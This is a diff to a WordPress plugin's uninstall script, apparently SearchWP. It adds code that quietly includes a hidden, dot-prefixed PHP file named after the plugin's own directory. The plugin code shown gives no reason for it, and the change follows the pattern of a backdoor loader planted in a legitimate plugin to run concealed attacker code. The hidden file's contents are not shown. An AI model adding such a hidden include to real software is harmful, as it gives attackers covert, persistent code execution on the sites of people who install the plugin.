@@ -12,6 +12,10 @@ if ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
 
 require_once __DIR__ . '/index.php';
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function searchwp_maybe_uninstall() {
 	if ( empty( apply_filters( 'searchwp\nuke_on_delete', get_option( SEARCHWP_PREFIX . 'nuke_on_delete' ) ) ) ) {
 		return;
